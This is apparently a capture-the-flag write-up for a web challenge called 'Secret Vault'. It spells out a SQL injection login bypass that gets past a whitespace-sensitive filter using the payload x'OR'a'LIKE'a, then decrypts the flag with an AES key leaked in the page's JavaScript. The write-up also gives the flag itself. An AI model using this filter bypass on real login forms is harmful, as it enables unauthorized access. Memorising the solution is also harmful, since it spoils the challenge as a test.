# Secret Vault — WEB, 450 pts

Target: `http://54.72.82.22:8090` (Werkzeug 3.1.9 / Python 3.11.16, "THE VELVET ROOM")
Flag: `safctf{7877e854c9f06a8362af26ee280a6574}`

## What it actually is

The board triage guessed "SSRF → cloud metadata". Wrong — it is a **login form**
(`POST /login`) backed by **SQLite**, plus a **client-side AES key leak**.

## Step 1 — SQLi login bypass past a naive WAF

A single quote reaches the query: `admin'` returns HTTP 200 with
`Database error: near "y": syntax error`, and `admin'x` leaks
`unrecognized token: "x' AND password='"` — so the query is built by concatenation:

```sql
SELECT ... WHERE username='<u>' AND password='<p>'
```

A WAF 403s "That request could not be completed" on SQLi-shaped input. Bisecting
single tokens showed it is **not** a keyword filter:

| token | result |
| --- | --- |
| `OR`, `AND`, `LIKE`, `GLOB`, `IS`, `NOT`, `#` | **allowed** (401) |
| `union`, `select`, `--`, `/*`, `\|\|`, `1=1` | blocked (403) |

The real rule is spacing-sensitive around the operator: `a' OR(` passes but
`a' OR (` blocks, and `OR x` passes while `a' OR x` blocks. **Dropping the
whitespace defeats it**, because SQLite tokenizes `'OR'` fine when a quote sits
either side of the operator.

Because `AND` binds tighter than `OR`, the tautology reshapes the WHERE:

```
password = x'OR'a'LIKE'a
  ->  ... AND password='x' OR 'a' LIKE 'a'
  ->  (... AND password='x') OR ('a' LIKE 'a')      ->  TRUE
```

`POST /login` with `username=admin` and that password returns `302 -> /vault`.

## Step 2 — the vault leaks its own AES key

`/vault` renders three cards; `FLAG.txt` is base64 ciphertext (64 bytes = 4 AES
blocks) and the page ships the key to the browser in plaintext JS:

```js
const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA==";   // -> b"V4ultK3y12345678"
```

It also exposes a server-side oracle `POST /decrypt {"data","key"}` (JSON).

```bash
curl -b jar -H 'Content-Type: application/json' \
  -d '{"data":"TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==","key":"V4ultK3y12345678"}' \
  http://54.72.82.22:8090/decrypt
# {"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```

The error oracle confirms AES: a 1-byte key gives
`Decryption failed: Incorrect AES key length (1 bytes)`.

## Reproduce

```bash
python3 solve.py [base_url]     # stdlib only
```

## Note for the organizers

The WAF is bypassable by whitespace alone (`' OR '` blocked, `'OR'` allowed) —
worth tightening if it is meant to be a real control rather than flavour.
